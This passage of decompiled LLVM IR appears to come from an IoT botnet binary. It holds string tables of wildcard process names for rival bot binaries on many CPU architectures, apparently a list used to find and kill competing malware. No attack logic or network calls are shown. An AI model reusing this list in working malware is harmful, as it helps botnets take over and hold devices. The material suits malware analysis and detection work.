@global_var_10018c04.502, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018c0c.503, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018c14.504, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018c1c.505, i32 0, i32 0), i8* bitcast (i32* @global_var_10018c24.506 to i8*), i8* bitcast (i32* @global_var_10018c28.507 to i8*), i8* bitcast (i32* @global_var_10018c2c.508 to i8*), i8* bitcast (i32* @global_var_10018c30.509 to i8*), i8* bitcast (i32* @global_var_10018c34.510 to i8*), i8* bitcast (i32* @global_var_10018c38.511 to i8*), i8* bitcast (i32* @global_var_10018c3c.512 to i8*), i8* bitcast (i32* @global_var_10018c40.513 to i8*), i8* bitcast (i32* @global_var_10018c44.514 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c48.515, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c4c.516, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c50.517, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c54.518, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c58.519, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c5c.520, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c60.521, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c64.522, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c68.523, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c6c.524, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c70.525, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c74.526, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018c78.527, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018c84.528, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10018c8c.529, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10018c94.530, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018c9c.531, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018ca0.532, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018ca4.533, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018ca8.534, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018cac.535, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018cb0.536, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018cb4.537, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018cb8.538, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10018cbc.539, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018cc0.540, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018cc4.541, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018cc8.542, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018ccc.543, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018cd0.544, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018cd4.545, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018cd8.546, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018cdc.547, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018ce0.548, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018ce4.549, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10018ce8.550, i32 0, i32 0)]
@global_var_10017774.552 = constant [8 x i8] c"jackmy*\00"
@global_var_1001777c.553 = constant [9 x i8] c"busybox*\00"
@global_var_10017788.554 = constant [5 x i8] c"bin*\00"
@global_var_100177a0.555 = constant [5 x i8] c"arm*\00"
@global_var_100177a8.556 = constant [8 x i8] c"mipsel*\00"
@global_var_100177b8.557 = constant [8 x i8] c"mips64*\00"
@global_var_100177c0.558 = constant [6 x i8] c"i686*\00"
@global_var_100177c8.559 = constant [7 x i8] c"sparc*\00"
@global_var_100177f4.560 = constant [6 x i8] c"bruv*\00"
@global_var_100177fc.561 = constant [7 x i8] c"sh2eb*\00"
@global_var_10017804.562 = constant [8 x i8] c"sh2elf*\00"
@global_var_1001780c.563 = constant [5 x i8] c"x86*\00"
@global_var_10017814.564 = constant [7 x i8] c"armv5*\00"
@global_var_1001781c.565 = constant [9 x i8] c"armv4tl*\00"
@global_var_10017828.566 = constant [7 x i8] c"armv4*\00"
@global_var_10017830.567 = constant [7 x i8] c"armv6*\00"
@global_var_10017838.568 = constant [9 x i8] c"powerpc*\00"
@global_var_10017844.569 = constant [14 x i8] c"powerpc440fp*\00"
@global_var_10017854.570 = constant [6 x i8] c"i586*\00"
@global_var_1001785c.571 = constant [6 x i8] c"m68k*\00"
@global_var_10017864.572 = constant [8 x i8] c"x86_64*\00"
@global_var_1001786c.573 = constant [12 x i8] c"jackmymips*\00"
@global_var_10017878.574 = constant [14 x i8] c"jackmymips64*\00"
@global_var_10017888.575 = constant [14 x i8] c"jackmymipsel*\00"
@global_var_10017898.576 = constant [13 x i8] c"jackmysh2eb*\00"
@global_var_100178a8.577 = constant [14 x i8] c"jackmysh2elf*\00"
@global_var_100178b8.578 = constant [11 x i8] c"jackmysh4*\00"
@global_var_100178c4.579 = constant [11 x i8] c"jackmyx86*\00"
@global_var_100178d0.580 = constant [13 x i8] c"jackmyarmv5*\00"
@global_var_100178e0.581 = constant [15 x i8] c"jackmyarmv4tl*\00"
@global_var_100178f0.582 = constant [13 x i8] c"jackmyarmv4*\00"
@global_var_10017900.583 = constant [13 x i8] c"jackmyarmv6*\00"
@global_var_10017910.584 = constant [12 x i8] c"jackmyi686*\00"
@global_var_1001791c.585 = constant [15 x i8] c"jackmypowerpc*\00"
@global_var_1001792c.586 = constant [20 x i8] c"jackmypowerpc440fp*\00"
@global_var_10017940.587 = constant [12 x i8] c"jackmyi586*\00"
@global_var_1001794c.588 = constant [12 x i8] c"jackmym68k*\00"
@global_var_10017958.589 = constant [13 x i8] c"jackmysparc*\00"
@global_var_10017968.590 = constant [14 x i8] c"jackmyx86_64*\00"
@global_var_10017978.591 = constant [12 x i8] c"hackmymips*\00"
@global_var_10017984.592 = constant [14 x i8] c"hackmymips64*\00"
@global_var_10017994.593 = constant [14 x i8] c"hackmymipsel*\00"
@global_var_100179a4.594 = constant [13 x i8] c"hackmysh2eb*\00"
@global_var_100179b4.595 = constant [14 x i8] c"hackmysh2elf*\00"
@global_var_100179c4.596 = constant [11 x i8] c"hackmysh4*\00"
@global_var_100179d0.597 = constant [11 x i8] c"hackmyx86*\00"
@global_var_100179dc.598 = constant [13 x i8] c"hackmyarmv5*\00"
@global_var_100179ec.599 = constant [15 x i8] c"hackmyarmv4tl*\00"
@global_var_100179fc.600 = constant [13 x i8] c"hackmyarmv4*\00"
@global_var_10017a0c.601 = constant [13 x i8] c"hackmyarmv6*\00"
@global_var_10017a1c.602 = constant [12 x i8] c"hackmyi686*\00"
@global_var_10017a28.603 = constant [15 x i8] c"hackmypowerpc*\00"
@global_var_10017a38.604 = constant [20 x i8] c"hackmypowerpc440fp*\00"
@global_var_10017a4c.605 = constant [12 x i8] c"hackmyi586*\00"
@global_var_10017a58.606 = constant [12 x i8] c"hackmym68k*\00"
@global_var_10017a64.607 = constant [13 x i8] c"hackmysparc*\00"
@global_var_10017a74.608 = constant [14 x i8] c"hackmyx86_64*\00"
@global_var_10017a84.609 = constant [4 x i8] c"b1*\00"
@global_var_10017a88.610 = constant [4 x i8] c"b2*\00"
@global_var_10017a8c.611 = constant [4 x i8] c"b3*\00"
@global_var_10017a90.612 = constant [4 x i8] c"b4*\00"
@global_var_10017a94.613 = constant [4 x i8] c"b5*\00"
@global_var_10017a98.614 = constant [4 x i8] c"b6*\00"
@global_var_10017a9c.615 = constant [4 x i8] c"b7*\00"
@global_var_10017aa0.616 = constant [4 x i8] c"b8*\00"
@global_var_10017aa4.617 = constant [4 x i8] c"b9*\00"
@global_var_10017aa8.618 = constant [5 x i8] c"b10*\00"
@global_var_10017ab0.619 = constant [5 x i8] c"b11*\00"
@global_var_10017ab8.620 = constant [5 x i8] c"b12*\00"
@global_var_10017ac0.621 = constant [5 x i8] c"b13*\00"
@global_var_10017ac8.622 = constant [5 x i8] c"b14*\00"
@global_var_10017ad0.623 = constant [5 x i8] c"b15*\00"
@global_var_10017ad8.624 = constant [5 x i8] c"b16*\00"
@global_var_10017ae0.625 = constant [5 x i8] c"b17*\00"
@global_var_10017ae8.626 = constant [5 x i8] c"b18*\00"
@global_var_10017af0.627 = constant [5 x i8] c"b19*\00"
@global_var_10017af8.628 = constant [5 x i8] c"b20*\00"
@global_var_10017b00.629 = constant [18 x i8] c"busyboxterrorist*\00"
@global_var_10017b14.630 = constant [10 x i8] c"DFhxdhdf*\00"
@global_var_10017b20.631 = constant [11 x i8] c"dvrHelper*\00"
@global_var_10017b2c.632 = constant [9 x i8] c"FDFDHFC*\00"
@global_var_10017b38.633 = constant [6 x i8] c"FEUB*\00"
@global_var_10017b40.634 = constant [10 x i8] c"FTUdftui*\00"
@global_var_10017b4c.635 = constant [10 x i8] c"GHfjfgvj*\00"
@global_var_10017b58.636 = constant [7 x i8] c"jhUOH*\00"
@global_var_10017b60.637 = constant [10 x i8] c"JIPJIPJj*\00"
@global_var_10017b6c.638 = constant [11 x i8] c"JIPJuipjh*\00"
@global_var_10017b78.639 = constant [9 x i8] c"kmymips*\00"
@global_var_10017b84.640 = constant [11 x i8] c"kmymips64*\00"
@global_var_10017b90.641 = constant [11 x i8] c"kmymipsel*\00"
@global_var_10017b9c.642 = constant [10 x i8] c"kmysh2eb*\00"
@global_var_10017ba8.643 = constant [11 x i8] c"kmysh2elf*\00"
@global_var_10017bb4.644 = constant [8 x i8] c"kmysh4*\00"
@global_var_10017bbc.645 = constant [8 x i8] c"kmyx86*\00"
@global_var_10017bc4.646 = constant [10 x i8] c"kmyarmv5*\00"
@global_var_10017bd0.647 = constant [12 x i8] c"kmyarmv4tl*\00"
@global_var_10017bdc.648 = constant [10 x i8] c"kmyarmv4*\00"
@global_var_10017be8.649 = constant [10 x i8] c"kmyarmv6*\00"
@global_var_10017bf4.650 = constant [9 x i8] c"kmyi686*\00"
@global_var_10017c00.651 = constant [12 x i8] c"kmypowerpc*\00"
@global_var_10017c0c.652 = constant [17 x i8] c"kmypowerpc440fp*\00"
@global_var_10017c20.653 = constant [9 x i8] c"kmyi586*\00"
@global_var_10017c2c.654 = constant [9 x i8] c"kmym68k*\00"
@global_var_10017c38.655 = constant [10 x i8] c"kmysparc*\00"
@global_var_10017c44.656 = constant [11 x i8] c"kmyx86_64*\00"
@global_var_10017c50.657 = constant [9 x i8] c"lolmips*\00"
@global_var_10017c5c.658 = constant [11 x i8] c"lolmips64*\00"
@global_var_10017c68.659 = constant [11 x i8] c"lolmipsel*\00"
@global_var_10017c74.660 = constant [10 x i8] c"lolsh2eb*\00"
@global_var_10017c80.661 = constant [11 x i8] c"lolsh2elf*\00"
@global_var_10017c8c.662 = constant [8 x i8] c"lolsh4*\00"
@global_var_10017c94.663 = constant [8 x i8] c"lolx86*\00"
@global_var_10017c9c.664 = constant [10 x i8] c"lolarmv5*\00"
@global_var_10017ca8.665 = constant [12 x i8] c"lolarmv4tl*\00"
@global_var_10017cb4.666 = constant [10 x i8] c"lolarmv4*\00"
@global_var_10017cc0.667 = constant [10 x i8] c"lolarmv6*\00"
@global_var_10017ccc.668 = constant [9 x i8] c"loli686*\00"
@global_var_10017cd8.669 = constant [12 x i8] c"lolpowerpc*\00"
@global_var_10017ce4.670 = constant [17 x i8] c"lolpowerpc440fp*\00"
@global_var_10017cf8.671 = constant [9 x i8] c"loli586*\00"
@global_var_10017d04.672 = constant [9 x i8] c"lolm68k*\00"
@global_var_10017d10.673 = constant [10 x i8] c"lolsparc*\00"
@global_var_10017d1c.674 = constant [9 x i8] c"RYrydry*\00"
@global_var_10017d28.675 = constant [9 x i8] c"telmips*\00"
@global_var_10017d34.676 = constant [11 x i8] c"telmips64*\00"
@global_var_10017d40.677 = constant [11 x i8] c"telmipsel*\00"
@global_var_10017d4c.678 = constant [10 x i8] c"telsh2eb*\00"
@global_var_10017d58.679 = constant [11 x i8] c"telsh2elf*\00"
@global_var_10017d64.680 = constant [8 x i8] c"telsh4*\00"
@global_var_10017d6c.681 = constant [8 x i8] c"telx86*\00"
@global_var_10017d74.682 = constant [10 x i8] c"telarmv5*\00"
@global_var_10017d80.683 = constant [12 x i8] c"telarmv4tl*\00"
@global_var_10017d8c.684 = constant [10 x i8] c"telarmv4*\00"
@global_var_10017d98.685 = constant [10 x i8] c"telarmv6*\00"
@global_var_10017da4.686 = constant [9 x i8] c"teli686*\00"
@global_var_10017db0.687 = constant [12 x i8] c"telpowerpc*\00"
@global_var_10017dbc.688 = constant [17 x i8] c"telpowerpc440fp*\00"
@global_var_10017dd0.689 = constant [9 x i8] c"teli586*\00"
@global_var_10017ddc.690 = constant [9 x i8] c"telm68k*\00"
@global_var_10017de8.691 = constant [10 x i8] c"telsparc*\00"
@global_var_10017df4.692 = constant [11 x i8] c"telx86_64*\00"
@global_var_10017e00.693 = constant [13 x i8] c"TwoFacemips*\00"
@global_var_10017e10.694 = constant [15 x i8] c"TwoFacemips64*\00"
@global_var_10017e20.695 = constant [15 x i8] c"TwoFacemipsel*\00"
@global_var_10017e30.696 = constant [14 x i8] c"TwoFacesh2eb*\00"
@global_var_10017e40.697 = constant [15 x i8] c"TwoFacesh2elf*\00"
@global_var_10017e50.698 = constant [12 x i8] c"TwoFacesh4*\00"
@global_var_10017e5c.699 = constant [12 x i8] c"TwoFacex86*\00"
@global_var_10017e68.700 = constant [14 x i8] c"TwoFacearmv5*\00"
@global_var_10017e78.701 = constant [16 x i8] c"TwoFacearmv4tl*\00"
@global_var_10017e88.702 = constant [14 x i8] c"TwoFacearmv4*\00"
@global_var_10017e98.703 = constant [14 x i8] c"TwoFacearmv6*\00"
@global_var_10017ea8.704 = constant [13 x i8] c"TwoFacei686*\00"
@global_var_10017eb8.705 = constant [16 x i8] c"TwoFacepowerpc*\00"
@global_var_10017ec8.706 = constant [21 x i8] c"TwoFacepowerpc440fp*\00"
@global_var_10017ee0.707 = constant [13 x i8] c"TwoFacei586*\00"
@global_var_10017ef0.708 = constant [13 x i8] c"TwoFacem68k*\00"
@global_var_10017f00.709 = constant [14 x i8] c"TwoFacesparc*\00"
@global_var_10017f10.710 = constant [15 x i8] c"TwoFacex86_64*\00"
@global_var_10017f20.711 = constant [10 x i8] c"UYyuyioy*\00"
@global_var_10017f2c.712 = constant [10 x i8] c"XDzdfxzf*\00"
@global_var_10017f38.713 = constant [6 x i8] c"xxb1*\00"
@global_var_10017f40.714 = constant [6 x i8] c"xxb2*\00"
@global_var_10017f48.715 = constant [6 x i8] c"xxb3*\00"
@global_var_10017f50.716 = constant [6 x i8] c"xxb4*\00"
@global_var_10017f58.717 = constant [6 x i8] c"xxb5*\00"
@global_var_10017f60.718 = constant [6 x i8] c"xxb6*\00"
@global_var_10017f68.719 = constant [6 x i8] c"xxb7*\00"
@global_var_10017f70.720 = constant [6 x i8] c"xxb8*\00"
@global_var_10017f78.721 = constant [6 x i8] c"xxb9*\00"
@global_var_10017f80.722 = constant [7 x i8] c"xxb10*\00"
@global_var_10017f88.723 = constant [7 x i8] c"xxb11*\00"
@global_var_10017f90.724 = constant [7 x i8] c"xxb12*\00"
@global_var_10017f98.725 = constant [7 x i8] c"xxb13*\00"
@global_var_10017fa0.726 = constant [7 x i8] c"xxb14*\00"
@global_var_10017fa8.727 = constant [7 x i8] c"xxb15*\00"
@global_var_10017fb0.728 = constant [7 x i8] c"xxb16*\00"
@global_var_10017fb8.729 = constant [7 x i8] c"xxb17*\00"
@global_var_10017fc0.730 = constant [7 x i8] c"xxb18*\00"
@global_var_10017fc8.731 = constant [7 x i8] c"xxb19*\00"
@global_var_10017fd0.732 = constant [7 x i8] c"xxb20*\00"
@global_var_10017fd8.733 = constant [3 x i8] c"1*\00"
@global_var_10017fdc.734 = constant [3 x i8] c"2*\00"
@global_var_10017fe0.735 = constant [3 x i8] c"3*\00"
@global_var_10017fe4.736 = constant [3 x i8] c"4*\00"
@global_var_10017fe8.737 = constant [3 x i8] c"5*\00"
@global_var_10017fec.738 = constant [3 x i8] c"6*\00"
@global_var_10017ff0.739 = constant [3 x i8] c"7*\00"
@global_var_10017ff4.740 = constant [3 x i8] c"8*\00"
@global_var_10017ff8.741 = constant [3 x i8] c"9*\00"
@global_var_10017ffc.742 = constant [4 x i8] c"10*\00"
@global_var_10018000.743 = constant [4 x i8] c"11*\00"
@global_var_10018004.744 = constant [4 x i8] c"12*\00"
@global_var_10018008.745 = constant [4 x i8] c"13*\00"
@global_var_1001800c.746 = constant [4 x i8] c"14*\00"
@global_var_10018010.747 = constant [4 x i8] c"15*\00"
@global_var_10018014.748 = constant [4 x i8] c"16*\00"
@global_var_10018018.749 = constant [4 x i8] c"17*\00"
@global_var_1001801c.750 = constant [4 x i8] c"18*\00"
@global_var_10018020.751 = constant [4 x i8] c"19*\00"
@global_var_10018024.752 = constant [4 x i8] c"20*\00"
@global_var_10018028.753 = constant [4 x i8] c"bb*\00"
@global_var_1001802c.754 = constant [12 x i8] c"busybotnet*\00"
@global_var_10018038.755 = constant [6 x i8] c"pppd*\00"
@global_var_10018040.756 = constant [7 x i8] c"pppoe*\00"
@global_var_10018048.757 = constant [6 x i8] c"wput*\00"
@global_var_10018050.758 = constant [4 x i8] c"B1*\00"
@global_var_10018054.759 = constant [4 x i8] c"B2*\00"
@global_var_10018058.760 = constant [4 x i8] c"B3*\00"
@global_var_1001805c.761 = constant [4 x i8] c"B4*\00"
@global_var_10018060.762 = constant [4 x i8] c"B5*\00"
@global_var_10018064.763 = constant [4 x i8] c"B6*\00"
@global_var_10018068.764 = constant [4 x i8] c"B7*\00"
@global_var_1001806c.765 = constant [4 x i8] c"B8*\00"
@global_var_10018070.766 = constant [4 x i8] c"B9*\00"
@global_var_10018074.767 = constant [5 x i8] c"B10*\00"
@global_var_1001807c.768 = constant [5 x i8] c"B11*\00"
@global_var_10018084.769 = constant [5 x i8] c"B12*\00"
@global_var_1001808c.770 = constant [5 x i8] c"B13*\00"
@global_var_10018094.771 = constant [5 x i8] c"B14*\00"
@global_var_1001809c.772 = constant [5 x i8] c"B15*\00"
@global_var_100180a4.773 = constant [5 x i8] c"B16*\00"
@global_var_100180ac.774 = constant [5 x i8] c"B17*\00"
@global_var_100180b4.775 = constant [5 x i8] c"B18*\00"
@global_var_100180bc.776 = constant [5 x i8] c"B20*\00"
@global_var_100180c4.777 = constant [11 x i8] c"dvrhelper*\00"
@global_var_100180d0.778 = constant [241 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017774.552, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001777c.553, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017788.554, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017790.319, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017798.324, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100177a0.555, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100177a8.556, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100177b0.318, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100177b8.557, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100177c0.558, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100177c8.559, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100177d0.322, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100177d8.313, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100177e0.323, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100177ec.315, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100177f4.560, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100177b0.318, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100177b8.557, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100177a8.556, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100177fc.561, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017804.562, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100177d0.322, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001780c.563, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100177a0.555, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017814.564, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001781c.565, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017828.566, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017830.567, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100177c0.558, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017838.568, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017844.569, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017854.570, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001785c.571, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100177c8.559, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017864.572, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001786c.573, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017878.574, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017888.575, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017898.576, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100178a8.577, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100178b8.578, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100178c4.579, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100178d0.580, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_100178e0.581, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100178f0.582, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017900.583, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017910.584, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1001791c.585, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1001792c.586, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017940.587, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001794c.588, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017958.589, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017968.590, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017978.591, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017984.592, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017994.593, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100179a4.594, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100179b4.595, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100179c4.596, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100179d0.597, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100179dc.598, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_100179ec.599, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100179fc.600, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017a0c.601, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017a1c.602, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_10017a28.603, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_10017a38.604, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017a4c.605, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10017a58.606, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10017a64.607, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10017a74.608, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017a84.609, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017a88.610, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017a8c.611, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017a90.612, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017a94.613, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017a98.614, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017a9c.615, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017aa0.616, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017aa4.617, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017aa8.618, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017ab0.619, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017ab8.620, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017ac0.621, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017ac8.622, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017ad0.623, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017ad8.624, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017ae0.625, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017ae8.626, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017af0.627, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017af8.628, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_10017b00.629, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017b14.630, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017b20.631, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017b2c.632, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017b38.633, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017b40.634, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017b4c.635, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017b58.636, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017b60.637, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10017b6c.638, i32 0, i32 0), i8* getelementptr inbounds ([9 x 